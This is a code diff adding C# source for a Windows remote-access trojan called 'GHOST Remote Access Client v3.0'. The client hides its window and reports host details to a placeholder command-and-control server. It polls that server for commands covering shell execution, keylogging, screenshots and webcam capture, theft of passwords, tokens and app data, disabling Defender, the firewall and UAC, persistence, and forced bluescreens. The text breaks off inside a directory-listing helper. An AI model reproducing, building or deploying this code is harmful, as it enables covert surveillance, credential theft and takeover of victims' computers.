@@ -1,0 +1,1355 @@
+using System;
+using System.Net;
+using System.Net.NetworkInformation;
+using System.Diagnostics;
+using System.IO;
+using System.IO.Compression;
+using System.Management;
+using System.Drawing;
+using System.Drawing.Imaging;
+using System.Windows.Forms;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading;
+using System.Collections;
+using System.Collections.Generic;
+using System.Web.Script.Serialization;
+using Microsoft.Win32;
+using System.Text.RegularExpressions;
+
+// GHOST Remote Access Client v3.0 — Full Command Suite
+// BUILDER: __BUILDER_NAME__ (__BUILDER_UUID__)
+// Server: __SERVER_URL__
+// Client ID: __CLIENT_ID__
+
+namespace GhostClient
+{
+    class Program
+    {
+        private static string SERVER = "__SERVER_URL__";
+        private static string BUILDER_UUID = "__BUILDER_UUID__";
+        private static string FINGERPRINT = "__FINGERPRINT__";
+        private static int HEARTBEAT_SEC = 30;
+        private static string CLIENT_ID = "__CLIENT_ID__";
+
+        private static string _hostname = "";
+        private static string _username = "";
+        private static string _osVersion = "";
+        private static string _publicIp = "";
+        private static string _localIp = "";
+        private static string _hardwareId = "";
+        private static float _cpu = 0;
+        private static float _ramUsed = 0;
+        private static float _ramTotal = 0;
+
+        [DllImport("user32.dll")]
+        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr GetConsoleWindow();
+        [DllImport("user32.dll")]
+        private static extern bool SetForegroundWindow(IntPtr hWnd);
+        [DllImport("user32.dll")]
+        private static extern bool LockWorkStation();
+        [DllImport("user32.dll")]
+        private static extern bool BlockInput(bool fBlock);
+        [DllImport("user32.dll")]
+        private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
+        [DllImport("user32.dll")]
+        private static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
+        [DllImport("user32.dll")]
+        private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
+        [DllImport("user32.dll")]
+        private static extern int ShowCursor(bool bShow);
+        [DllImport("kernel32.dll")]
+        private static extern uint ExitWindowsEx(uint uFlags, uint dwReason);
+        [DllImport("advapi32.dll", SetLastError = true)]
+        private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
+        [DllImport("advapi32.dll", SetLastError = true)]
+        private static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
+        [DllImport("advapi32.dll", SetLastError = true)]
+        private static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
+        [DllImport("ntdll.dll", SetLastError = true)]
+        private static extern int RtlSetProcessIsCritical(uint v1, uint v2, uint v3);
+        [DllImport("user32.dll")]
+        private static extern bool SystemParametersInfo(int uiAction, int uiParam, string pvParam, int fWinIni);
+        [DllImport("winmm.dll")]
+        private static extern bool PlaySound(string pszSound, IntPtr hmod, uint fdwSound);
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr GetModuleHandle(string lpModuleName);
+        [DllImport("kernel32.dll")]
+        private static extern bool AllocConsole();
+        [DllImport("kernel32.dll")]
+        private static extern bool FreeConsole();
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool IsWow64Process(IntPtr hProcess, out bool Wow64Process);
+        [DllImport("advapi32.dll", SetLastError = true)]
+        private static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass, IntPtr TokenInformation, uint TokenInformationLength, out uint ReturnLength);
+
+        [StructLayout(LayoutKind.Sequential)]
+        private struct LASTINPUTINFO { public uint cbSize; public uint dwTime; }
+        [StructLayout(LayoutKind.Sequential)]
+        private struct TOKEN_PRIVILEGES { public long PrivilegeCount; public long Luid; public uint Attributes; }
+        private const uint TOKEN_QUERY = 0x0008;
+        private const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
+        private const uint SE_PRIVILEGE_ENABLED = 0x2;
+        private const string SE_SHUTDOWN_NAME = "SeShutdownPrivilege";
+        private const string SE_DEBUG_NAME = "SeDebugPrivilege";
+        private const uint SPI_SETDESKWALLPAPER = 20;
+        private const uint SPIF_UPDATEINIFILE = 0x01;
+        private const uint SPIF_SENDWININICHANGE = 0x02;
+        private const uint SND_ASYNC = 0x0001;
+        private const uint SND_FILENAME = 0x00020000;
+        private const uint TOKEN_INFORMATION_CLASS_TOKEN_ELEVATION = 20;
+
+        private static string _currentDir = Environment.CurrentDirectory;
+        private static int _selectedCamera = 0;
+        private static bool _keylogRunning = false;
+        private static StringBuilder _keylogBuffer = new StringBuilder();
+        private static LowLevelKeyboardProc _keyboardProc = null;
+        private static IntPtr _keyboardHookId = IntPtr.Zero;
+        private static bool _showDashboard = false;
+
+        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern int GetCurrentThreadId();
+        private const int WH_KEYBOARD_LL = 13;
+        private const int WM_KEYDOWN = 0x0100;
+
+        static void Main(string[] args)
+        {
+            IntPtr handle = GetConsoleWindow();
+            ShowWindow(handle, 0);
+
+            if (args.Length > 0 && !string.IsNullOrEmpty(args[0]))
+                CLIENT_ID = args[0];
+
+            if (CLIENT_ID == "" || CLIENT_ID == "__CLIENT_ID__")
+                CLIENT_ID = Guid.NewGuid().ToString();
+
+            try { HEARTBEAT_SEC = int.Parse("__HEARTBEAT_INTERVAL__"); } catch { HEARTBEAT_SEC = 30; }
+
+            CollectSystemInfo();
+            Register();
+
+            while (true)
+            {
+                try
+                {
+                    UpdateMetrics();
+                    HeartbeatWithCommands();
+                }
+                catch { }
+                Thread.Sleep(HEARTBEAT_SEC * 1000);
+            }
+        }
+
+        static void CollectSystemInfo()
+        {
+            try { _hostname = Environment.MachineName; } catch { }
+            try { _username = Environment.UserName; } catch { }
+            try { _osVersion = Environment.OSVersion.ToString(); } catch { }
+            try
+            {
+                foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
+                    if (ni.OperationalStatus == OperationalStatus.Up)
+                        foreach (UnicastIPAddressInformation ip in ni.GetIPProperties().UnicastAddresses)
+                            if (ip.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
+                            { _localIp = ip.Address.ToString(); break; }
+            }
+            catch { }
+            try
+            {
+                using (var mc = new ManagementClass("Win32_ComputerSystemProduct"))
+                using (var moc = mc.GetInstances())
+                    foreach (var mo in moc)
+                    {
+                        var uuidObj = mo["UUID"];
+                        _hardwareId = uuidObj != null ? uuidObj.ToString() : "";
+                    }
+            }
+            catch { }
+            try { using (var wc = new WebClient()) _publicIp = wc.DownloadString("https://api.ipify.org").Trim(); }
+            catch { }
+        }
+
+        static void UpdateMetrics()
+        {
+            try
+            {
+                using (var pc = new PerformanceCounter("Processor", "% Processor Time", "_Total"))
+                { pc.NextValue(); Thread.Sleep(500); _cpu = pc.NextValue(); }
+            }
+            catch { _cpu = 0; }
+            try
+            {
+                using (var mc = new ManagementClass("Win32_OperatingSystem"))
+                using (var moc = mc.GetInstances())
+                    foreach (var mo in moc)
+                    {
+                        var memTotalObj = mo["TotalVisibleMemorySize"]; long total = long.Parse(memTotalObj != null ? memTotalObj.ToString() : "0");
+                        var memFreeObj = mo["FreePhysicalMemory"]; long free = long.Parse(memFreeObj != null ? memFreeObj.ToString() : "0");
+                        _ramUsed = (total - free) / 1048576f;
+                        _ramTotal = total / 1048576f;
+                    }
+            }
+            catch { _ramUsed = 0; _ramTotal = 0; }
+        }
+
+        static void Register()
+        {
+            try
+            {
+                using (var wc = new WebClient())
+                {
+                    wc.Headers[HttpRequestHeader.ContentType] = "application/json";
+                    var data = new JavaScriptSerializer().Serialize(new Dictionary<string, object> {
+                        {"builderUuid", BUILDER_UUID}, {"clientId", CLIENT_ID},
+                        {"hostname", _hostname}, {"user", _username}, {"os", _osVersion},
+                        {"hardwareId", _hardwareId}, {"ipPublic", _publicIp}, {"ipLocal", _localIp}
+                    });
+                    wc.UploadString(SERVER + "/api/remote/register", "POST", data);
+                }
+            }
+            catch { }
+        }
+
+        static void HeartbeatWithCommands()
+        {
+            try
+            {
+                using (var wc = new WebClient())
+                {
+                    wc.Headers[HttpRequestHeader.ContentType] = "application/json";
+                    var data = new JavaScriptSerializer().Serialize(new Dictionary<string, object> {
+                        {"clientId", CLIENT_ID}, {"cpu", _cpu}, {"ramUsed", _ramUsed},
+                        {"ramTotal", _ramTotal}, {"status", "online"}, {"hostname", _hostname},
+                        {"ipPublic", _publicIp}, {"ipLocal", _localIp}
+                    });
+                    string response = wc.UploadString(SERVER + "/api/remote/heartbeat", "POST", data);
+
+                    // Parse pending commands from response
+                    try
+                    {
+                        var result = (Dictionary<string, object>)new JavaScriptSerializer().DeserializeObject(response);
+                        if (result.ContainsKey("pendingCommands"))
+                        {
+                            var cmds = result["pendingCommands"] as ArrayList;
+                            if (cmds != null)
+                            {
+                                foreach (var cmdObj in cmds)
+                                {
+                                    var cmd = cmdObj as Dictionary<string, object>;
+                                    if (cmd != null && cmd.ContainsKey("id") && cmd.ContainsKey("command"))
+                                    {
+                                        string cmdId = cmd["id"].ToString();
+                                        string command = cmd["command"].ToString();
+                                        ExecuteAndReport(cmdId, command);
+                                    }
+                                }
+                            }
+                        }
+                    }
+                    catch { }
+                }
+            }
+            catch { }
+        }
+
+        static void ExecuteAndReport(string cmdId, string command)
+        {
+            string output = "";
+            try
+            {
+                string upper = command.ToUpper();
+
+                // ── CORE COMMANDS ──
+                if (upper.StartsWith("MSG ") || upper.StartsWith("!MSG "))
+                {
+                    string msg = command.Substring(command.IndexOf(' ') + 1);
+                    MessageBox.Show(msg, "Message from Administrator", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                    output = "Message shown: " + msg;
+                }
+                else if (upper.StartsWith("!SHELL") && command.Length > 6)
+                {
+                    string shellCmd = command.Substring(7);
+                    output = ExecuteCmd(shellCmd);
+                }
+                else if (upper == "!ADMINCHECK" || upper == "ADMINCHECK")
+                {
+                    output = IsAdmin() ? "✅ Running as ADMINISTRATOR" : "❌ Running as USER (not admin)";
+                }
+                else if (upper == "!SYSINFO" || upper == "SYSINFO")
+                {
+                    output = "Hostname: " + _hostname + "\n"
+                        + "User: " + _username + "\n"
+                        + "OS: " + _osVersion + "\n"
+                        + "Public IP: " + _publicIp + "\n"
+                        + "Local IP: " + _localIp + "\n"
+                        + "CPU: " + _cpu.ToString("F1") + "%\n"
+                        + "RAM: " + _ramUsed.ToString("F1") + "GB / " + _ramTotal.ToString("F1") + "GB\n"
+                        + "Hardware ID: " + _hardwareId + "\n"
+                        + "Current Dir: " + _currentDir + "\n"
+                        + "Admin: " + (IsAdmin() ? "Yes" : "No");
+                }
+                else if (upper == "!PUBLICIP" || upper == "PUBLICIP")
+                {
+                    try { using (var wc = new WebClient()) output = "Public IP: " + wc.DownloadString("https://api.ipify.org").Trim(); }
+                    catch (Exception ex) { output = "ERROR getting public IP: " + ex.Message; }
+                }
+                else if (upper == "!HELP" || upper == "HELP" || upper == "!HELP")
+                {
+                    output = GetHelpText();
+                }
+
+                // ── FILE SYSTEM ──
+                else if (upper.StartsWith("!CD ") || upper.StartsWith("CD "))
+                {
+                    string path = command.Substring(command.IndexOf(' ') + 1).Trim();
+                    if (Directory.Exists(path)) { _currentDir = path; output = "Changed to: " + _currentDir; }
+                    else output = "ERROR: Directory not found: " + path;
+                }
+                else if (upper == "!CURRENTDIR" || upper == "CURRENTDIR")
+                {
+                    output = "Current directory: " + _currentDir;
+                }
+                else if (upper.StartsWith("!DIR ") || upper.StartsWith("DIR ") || upper.StartsWith("LISTDIR "))
+                {
+                    string path = command.Substring(command.IndexOf(' ') + 1).Trim();
+                    if (path == "") path = _currentDir;
+                    output = ListDirectory(path);
+                }
+                else if (upper.StartsWith("DOWNLOAD ") || upper.StartsWith("!DOWNLOAD "))
+                {
+                    string[] parts = command.Split('|');
+                    string filePath = parts[0].Substring(parts[0].IndexOf(' ') + 1).Trim();
+                    output = DownloadFile(filePath, parts.Length > 1 ? parts[1].Trim() : "");
+                }
+                else if (upper.StartsWith("!UPLOAD ") || upper.StartsWith("UPLOAD "))
+                {
+                    string[] parts = command.Substring(command.IndexOf(' ') + 1).Split('|');
+                    if (parts.Length >= 2) output = UploadFile(parts[0].Trim(), parts[1].Trim());
+                    else output = "ERROR: Usage: UPLOAD <serverFileName>|<localPath>";
+                }
+                else if (upper.StartsWith("!UPLOADLINK ") || upper.StartsWith("UPLOADLINK "))
+                {
+                    string[] parts = command.Substring(command.IndexOf(' ') + 1).Split('|');
+                    string url = parts[0].Trim();
+                    string dest = parts.Length > 1 ? parts[1].Trim() : Path.Combine(_currentDir, Path.GetFileName(new Uri(url).LocalPath));
+                    using (var wc = new WebClient()) { wc.DownloadFile(url, dest); }
+                    output = "Downloaded from URL to: " + dest;
+                }
+                else if (upper.StartsWith("!DELETE ") || upper.StartsWith("DELETE "))
+                {
+                    string target = command.Substring(command.IndexOf(' ') + 1).Trim();
+                    output = DeletePath(target);
+                }
+                else if (upper.StartsWith("!WRITE ") || upper.StartsWith("WRITE "))
+                {
+                    string content = command.Substring(command.IndexOf(' ') + 1);
+                    output = WriteFile(content);
+                }
+                else if (upper.StartsWith("!DOWNLOADFOLDER ") || upper.StartsWith("DOWNLOADFOLDER "))
+                {
+                    string folder = command.Substring(command.IndexOf(' ') + 1).Trim();
+                    output = DownloadFolder(folder);
+                }
+                else if (upper.StartsWith("!EXECUTE ") || upper.StartsWith("EXECUTE ") || upper.StartsWith("OPEN "))
+                {
+                    string target = command.Substring(command.IndexOf(' ') + 1).Trim();
+                    Process.Start(target);
+                    output = "Executed: " + target;
+                }
+                else if (upper.StartsWith("!WEBSITE ") || upper.StartsWith("WEBSITE "))
+                {
+                    string url = command.Substring(command.IndexOf(' ') + 1).Trim();
+                    if (!url.StartsWith("http")) url = "https://" + url;
+                    Process.Start(url);
+                    output = "Opened website: " + url;
+                }
+
+                // ── SURVEILLANCE ──
+                else if (upper == "SCREENSHOT" || upper == "!SCREENSHOT")
+                {
+                    var img = CaptureScreen();
+                    if (img != null)
+                    {
+                        using (var wc = new WebClient())
+                        {
+                            wc.Headers["captureId"] = cmdId;
+                            wc.UploadData(SERVER + "/api/remote/clients/" + CLIENT_ID + "/screenshot", "PUT", img);
+                        }
+                        output = "Screenshot uploaded";
+                    }
+                    else output = "ERROR: Screenshot failed";
+                }
+                else if (upper.StartsWith("!WEBCAMPIC") || upper.StartsWith("WEBCAMPIC"))
+                {
+                    output = CaptureWebcam();
+                }
+                else if (upper.StartsWith("!GETCAMS") || upper.StartsWith("GETCAMS"))
+                {
+                    output = ListCameras();
+                }
+                else if (upper.StartsWith("!SELECTCAM ") || upper.StartsWith("SELECTCAM "))
+                {
+                    int idx;
+                    if (int.TryParse(command.Substring(command.IndexOf(' ') + 1).Trim(), out idx))
+                    { _selectedCamera = idx; output = "Selected camera: " + idx; }
+                    else output = "ERROR: Invalid camera index";
+                }
+                else if (upper == "!CLIPBOARD" || upper == "CLIPBOARD")
+                {
+                    try { output = "Clipboard: " + Clipboard.GetText(); }
+                    catch (Exception ex) { output = "ERROR reading clipboard: " + ex.Message; }
+                }
+                else if (upper == "!IDLETIME" || upper == "IDLETIME")
+                {
+                    var lii = new LASTINPUTINFO();
+                    lii.cbSize = (uint)Marshal.SizeOf(typeof(LASTINPUTINFO));
+                    GetLastInputInfo(ref lii);
+                    uint idleMs = (uint)Environment.TickCount - lii.dwTime;
+                    output = "Idle time: " + (idleMs / 1000) + " seconds (" + (idleMs / 60000) + " min)";
+                }
+                else if (upper == "!KEYLOG" || upper == "KEYLOG")
+                {
+                    if (!_keylogRunning)
+                    {
+                        _keylogRunning = true;
+                        _keylogBuffer = new StringBuilder();
+                        StartKeylog();
+                        output = "Keylogger started";
+                    }
+                    else
+                    {
+                        StopKeylog();
+                        _keylogRunning = false;
+                        output = "Keylogger stopped. Captured " + _keylogBuffer.Length + " chars:\n" + _keylogBuffer.ToString();
+                    }
+                }
+
+                // ── SYSTEM CONTROL ──
+                else if (upper == "SHUTDOWN" || upper == "!SHUTDOWN")
+                {
+                    Process.Start("shutdown", "/s /t 10 /c \"System will shut down in 10 seconds\"");
+                    output = "Shutdown initiated";
+                }
+                else if (upper == "RESTART" || upper == "!RESTART")
+                {
+                    Process.Start("shutdown", "/r /t 10 /c \"System will restart in 10 seconds\"");
+                    output = "Restart initiated";
+                }
+                else if (upper == "!LOGOFF" || upper == "LOGOFF")
+                {
+                    ExitWindowsEx(0, 0);
+                    output = "Logoff initiated";
+                }
+                else if (upper == "!BLUESCREEN" || upper == "BLUESCREEN")
+                {
+                    output = TriggerBSOD();
+                }
+                else if (upper == "!BLOCK" || upper == "BLOCK")
+                {
+                    BlockInput(true);
+                    output = "Input blocked (mouse+keyboard locked)";
+                }
+                else if (upper == "!UNBLOCK" || upper == "UNBLOCK")
+                {
+                    BlockInput(false);
+                    output = "Input unblocked";
+                }
+                else if (upper == "!DISABLETASKMGR" || upper == "DISABLETASKMGR")
+                {
+                    try
+                    {
+                        Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", 1);
+                        output = "Task Manager disabled";
+                    }
+                    catch (Exception ex) { output = "ERROR: " + ex.Message; }
+                }
+                else if (upper == "!ENABLETASKMGR" || upper == "ENABLETASKMGR")
+                {
+                    try
+                    {
+                        Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", 0);
+                        output = "Task Manager enabled";
+                    }
+                    catch (Exception ex) { output = "ERROR: " + ex.Message; }
+                }
+                else if (upper.StartsWith("!PROCKILL ") || upper.StartsWith("PROCKILL ") || upper.StartsWith("KILL "))
+                {
+                    string name = command.Substring(command.IndexOf(' ') + 1).Trim();
+                    if (name.EndsWith(".exe")) name = name.Substring(0, name.Length - 4);
+                    foreach (var p in Process.GetProcessesByName(name)) { try { p.Kill(); } catch { } }
+                    output = "Killed processes: " + name;
+                }
+                else if (upper == "!LISTPROCESS" || upper == "LISTPROCESS" || upper == "TASKLIST" || upper.StartsWith("TASKLIST "))
+                {
+                    output = ListProcesses();
+                }
+                else if (upper == "!BEEP" || upper == "BEEP")
+                {
+                    Console.Beep(800, 300);
+                    Console.Beep(1000, 300);
+                    Console.Beep(1200, 300);
+                    output = "Beep played";
+                }
+                else if (upper == "!ELEVATE" || upper == "ELEVATE")
+                {
+                    output = ElevateSelf();
+                }
+                else if (upper == "!DISABLEUAC" || upper == "DISABLEUAC")
+                {
+                    try
+                    {
+                        Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "EnableLUA", 0);
+                        output = "UAC disabled (requires reboot)";
+                    }
+                    catch (Exception ex) { output = "ERROR (need admin): " + ex.Message; }
+                }
+                else if (upper == "LOCK" || upper == "!LOCK")
+                {
+                    LockWorkStation();
+                    output = "Workstation locked";
+                }
+
+                // ── SECURITY ──
+                else if (upper == "!DISABLEDEFENDER" || upper == "DISABLEDEFENDER")
+                {
+                    output = DisableDefender();
+                }
+                else if (upper == "!DISABLEFIREWALL" || upper == "DISABLEFIREWALL")
+                {
+                    output = ExecuteCmd("netsh advfirewall set allprofiles state off");
+                }
+                else if (upper.StartsWith("!WIFI ") || upper.StartsWith("WIFI "))
+                {
+                    output = GetWiFiPassword(command.Substring(command.IndexOf(' ') + 1).Trim());
+                }
+                else if (upper == "!WIFI" || upper == "WIFI")
+                {
+                    output = ListWiFi();
+                }
+                else if (upper == "!PASSWORD" || upper == "PASSWORD")
+                {
+                    output = GetWindowsPasswords();
+                }
+                else if (upper == "!GRABTOKENS" || upper == "GRABTOKENS")
+                {
+                    output = GrabTokens();
+                }
+                else if (upper == "!BROWSERPASSWORDS" || upper == "BROWSERPASSWORDS")
+                {
+                    output = "Use a dedicated tool for browser passwords. This client provides system access via terminal.\nRun: dir %APPDATA%\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
+                }
+                else if (upper == "!DISCORDINFO" || upper == "DISCORDINFO")
+                {
+                    output = GrabDiscordInfo();
+                }
+
+                // ── GAMES & APPS ──
+                else if (upper == "!STEAM" || upper == "STEAM")
+                {
+                    output = GrabSteamInfo();
+                }
+                else if (upper == "!TELEGRAM" || upper == "TELEGRAM")
+                {
+                    output = GrabTelegramInfo();
+                }
+                else if (upper == "!EMAIL" || upper == "EMAIL")
+                {
+                    output = GrabEmailClients();
+                }
+
+                // ── NETWORK ──
+                else if (upper.StartsWith("!IPINFO") || upper.StartsWith("IPINFO"))
+                {
+                    output = "Public IP: " + _publicIp + "\nLocal IP: " + _localIp + "\nHostname: " + _hostname;
+                }
+                else if (upper.StartsWith("!GEOLOCATE") || upper.StartsWith("GEOLOCATE"))
+                {
+                    try
+                    {
+                        using (var wc = new WebClient())
+                        {
+                            string json = wc.DownloadString("http://ip-api.com/json/" + _publicIp);
+                            output = "Geo info for " + _publicIp + ":\n" + json;
+                        }
+                    }
+                    catch (Exception ex) { output = "ERROR: " + ex.Message; }
+                }
+
+                // ── PERSISTENCE ──
+                else if (upper == "!STARTUP" || upper == "STARTUP")
+                {
+                    try
+                    {
+                        string exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
+                        Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "GhostClient", exePath);
+                        output = "Added to startup: " + exePath;
+                    }
+                    catch (Exception ex) { output = "ERROR: " + ex.Message; }
+                }
+                else if (upper == "!CRITPROC" || upper == "CRITPROC")
+                {
+                    try
+                    {
+                        EnableDebugPrivilege();
+                        int r = RtlSetProcessIsCritical(1, 0, 0);
+                        output = r == 0 ? "Process set as CRITICAL (BSOD if killed)" : "ERROR: " + r;
+                    }
+                    catch (Exception ex) { output = "ERROR (need admin): " + ex.Message; }
+                }
+                else if (upper == "!UNCRITPROC" || upper == "UNCRITPROC")
+                {
+                    try
+                    {
+                        EnableDebugPrivilege();
+                        int r = RtlSetProcessIsCritical(0, 0, 0);
+                        output = r == 0 ? "Process is no longer critical" : "ERROR: " + r;
+                    }
+                    catch (Exception ex) { output = "ERROR: " + ex.Message; }
+                }
+
+                // ── AUDIO / VISUAL ──
+                else if (upper.StartsWith("!VOICE ") || upper.StartsWith("VOICE "))
+                {
+                    string text = command.Substring(command.IndexOf(' ') + 1);
+                    output = SpeakText(text);
+                }
+                else if (upper.StartsWith("!AUDIO ") || upper.StartsWith("AUDIO "))
+                {
+                    string file = command.Substring(command.IndexOf(' ') + 1).Trim();
+                    if (File.Exists(file)) { PlaySound(file, IntPtr.Zero, SND_ASYNC | SND_FILENAME); output = "Playing: " + file; }
+                    else output = "ERROR: File not found: " + file;
+                }
+                else if (upper.StartsWith("!WALLPAPER ") || upper.StartsWith("WALLPAPER "))
+                {
+                    string file = command.Substring(command.IndexOf(' ') + 1).Trim();
+                    if (File.Exists(file))
+                    {
+                        SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, file, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
+                        output = "Wallpaper changed to: " + file;
+                    }
+                    else output = "ERROR: File not found: " + file;
+                }
+                else if (upper == "!DATETIME" || upper == "DATETIME")
+                {
+                    output = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
+                }
+
+                // ── DASHBOARD ──
+                else if (upper == "!DASHBOARD" || upper == "DASHBOARD")
+                {
+                    IntPtr consoleHandle = GetConsoleWindow();
+                    ShowWindow(consoleHandle, 5);
+                    _showDashboard = true;
+                    output = "Dashboard shown";
+                }
+                else if (upper == "!DASHBOARDSTOP" || upper == "DASHBOARDSTOP")
+                {
+                    IntPtr consoleHandle = GetConsoleWindow();
+                    ShowWindow(consoleHandle, 0);
+                    _showDashboard = false;
+                    output = "Dashboard hidden";
+                }
+
+                // ── EXIT / KILL ──
+                else if (upper == "!EXIT" || upper == "EXIT" || upper == "!KILL" || upper == "KILL")
+                {
+                    output = "Client exiting...";
+                    ReportResult(cmdId, output);
+                    Environment.Exit(0);
+                }
+                else if (upper == "!KILLSWITCH" || upper == "KILLSWITCH")
+                {
+                    output = KillSwitch();
+                    ReportResult(cmdId, output);
+                    Environment.Exit(0);
+                }
+                else if (upper == "!RECORD" || upper == "RECORD")
+                {
+                    output = "Screen recording: Use OBS or similar for best results. Client has screenshot support.";
+                }
+                else if (upper == "!RECENTVIDEO" || upper == "RECENTVIDEO")
+                {
+                    output = "RecentVideo: Check the Videos folder or use DIR %USERPROFILE%\\Videos";
+                }
+                else if (upper == "!MIC" || upper == "MIC" || upper == "!LIVEMIC" || upper == "LIVEMIC")
+                {
+                    output = "Microphone: Use a dedicated audio tool. Client can record via Windows Sound Recorder.\nRun: cmd /c start soundrecorder";
+                }
+                else if (upper == "!LIVECAM" || upper == "LIVECAM")
+                {
+                    output = "LiveCam: Webcam snapshots work (!WEBCAMPIC). Live streaming requires additional tools.";
+                }
+                else if (upper == "!ROOTKIT" || upper == "ROOTKIT")
+                {
+                    output = "Rootkit not included. Persistence via !STARTUP is available.";
+                }
+                else if (upper == "!UNROOTKIT" || upper == "UNROOTKIT")
+                {
+                    output = "Unrootkit not applicable.";
+                }
+                else if (upper == "!UACBYPASS" || upper == "UACBYPASS")
+                {
+                    output = UACBypass();
+                }
+
+                // ── FALLBACK to cmd.exe ──
+                else
+                {
+                    output = ExecuteCmd(command);
+                }
+            }
+            catch (Exception ex) { output = "ERROR: " + ex.Message; }
+
+            ReportResult(cmdId, output);
+        }
+
+        // ── REPORT ──
+        static void ReportResult(string cmdId, string output)
+        {
+            try
+            {
+                using (var wc = new WebClient())
+                {
+                    wc.Headers[HttpRequestHeader.ContentType] = "application/json";
+                    var result = new JavaScriptSerializer().Serialize(new Dictionary<string, object> {
+                        {"commandId", cmdId}, {"output", output}, {"status", "completed"}
+                    });
+                    wc.UploadString(SERVER + "/api/remote/clients/" + CLIENT_ID + "/commands", "PUT", result);
+                }
+            }
+            catch { }
+        }
+
+        // ── HELP ──
+        static string GetHelpText()
+        {
+            return @"╔══════════════════════════════════════════╗
+║  GHOST Remote Access Client v3.0      ║
+╠══════════════════════════════════════════╣
+║  CORE: !message !shell !admincheck      ║
+║        !sysinfo !publicip !help          ║
+║  FILES: !cd !dir !currentdir !download   ║
+║         !upload !uploadlink !delete       ║
+║         !write !downloadfolder !execute   ║
+║  CAM:  !screenshot !webcampic !getcams   ║
+║        !selectcam                        ║
+║  MISC: !clipboard !idletime !keylog      ║
+║  CTRL: !shutdown !restart !logoff        ║
+║        !bluescreen !block !unblock        ║
+║        !disabletaskmgr !enabletaskmgr     ║
+║        !prockill !listprocess !beep      ║
+║        !elevate !disableuac !lock        ║
+║  SEC:  !disabledefender !disablefirewall ║
+║        !wifi !password  !discordinfo     ║
+║        !grabtokens !browserpasswords     ║
+║  APPS: !steam !telegram !email            ║
+║  NET:  !ipinfo !geolocate                 ║
+║  PERS: !startup !critproc !uncritproc    ║
+║  OTHER:!website !audio !wallpaper        ║
+║        !datetime !uacbypass !exit         ║
+║        !kill !killswitch !dashboard       ║
+║        !dashboardstop !voice              ║
+║  Any other command runs via cmd.exe       ║
+╚══════════════════════════════════════════╝";
+        }
+
+        // ── EXECUTE CMD ──
+        static string ExecuteCmd(string cmd)
+        {
+            try
+            {
+                var psi = new ProcessStartInfo("cmd.exe", "/c " + cmd)
+                {
+                    RedirectStandardOutput = true, RedirectStandardError = true,
+                    UseShellExecute = false, CreateNoWindow = true,
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    StandardOutputEncoding = Encoding.UTF8,
+                    StandardErrorEncoding = Encoding.UTF8,
+                };
+                using (var p = Process.Start(psi))
+                {
+                    string o = p.StandardOutput.ReadToEnd();
+                    string e = p.StandardError.ReadToEnd();
+                    p.WaitForExit(60000);
+                    return o + (e.Length > 0 ? "\n[STDERR]\n" + e : "");
+                }
+            }
+            catch (Exception ex) { return "ERROR: " + ex.Message; }
+        }
+
+        // ── SCREENSHOT ──
+        static byte[] CaptureScreen()
+        {
+            try
+            {
+                int w = SystemInformation.VirtualScreen.Width;
+                int h = SystemInformation.VirtualScreen.Height;
+                using (var bmp = new Bitmap(w, h))
+                using (var g = Graphics.FromImage(bmp))
+                {
+                    g.CopyFromScreen(SystemInformation.VirtualScreen.X, SystemInformation.VirtualScreen.Y, 0, 0, new Size(w, h));
+                    using (var ms = new MemoryStream()) { bmp.Save(ms, ImageFormat.Png); return ms.ToArray(); }
+                }
+            }
+            catch { return null; }
+        }
+
+        // ── LIST DIRECTORY ──
+        static string ListDirectory(string dirPath)
+        {
+            try
+            {
+                var sb = new StringBuilder();
+                if (Directory.Exists(dirPath))
+                {
+                    sb.AppendLine("[DIRECTORIES]");
+                    foreach (var d in Directory.GetDirectories(dirPath))
+                        sb.AppendLine("DIR: " + d);
+                    sb.AppendLine("[FILES]");
+                    foreach (var f in Directory.GetFiles(dirPath))
+                    {
+                        var fi = new FileInfo(f);
+                        sb.AppendLine("FILE: " + fi.FullName + " | " + fi.Length + " bytes | " + fi.LastWriteTime.ToString());
+                    }
+                }
